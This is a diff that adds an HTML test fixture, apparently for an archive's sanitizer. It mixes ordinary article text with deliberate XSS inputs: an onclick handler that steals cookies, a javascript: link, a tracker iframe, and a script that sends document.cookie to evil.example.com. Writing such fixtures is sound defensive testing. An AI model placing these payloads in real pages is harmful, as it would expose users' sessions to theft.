@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><title>A Perfectly Ordinary Post</title></head>
+<body>
+<article>
+  <h1>A Perfectly Ordinary Post</h1>
+  <p onclick="steal(document.cookie)">This paragraph carries an inline event handler
+  that must not survive extraction, because the archive renders decade-old markup
+  in the reader's own browser and on the reader's own origin.</p>
+  <p>Here is <a href="javascript:alert(document.domain)">a link that is not a link</a>
+  and here is <a href="/relative/page">a genuinely relative one</a> that has to be
+  resolved before it is stored, or it will resolve against the archive instead.</p>
+  <p><img src="../images/photo.jpg" srcset="../images/photo-480.jpg 480w, ../images/photo-960.jpg 960w" alt="A photograph"></p>
+  <script>fetch('https://evil.example.com/collect?c=' + document.cookie);</script>
+  <iframe src="https://tracker.example.com/pixel"></iframe>
+  <p>The body text itself is ordinary and should come through intact, which is the
+  point: sanitization must remove the dangerous parts without damaging the article
+  that a reader actually wants to keep and read years from now.</p>
+</article>
+</body>
+</html>
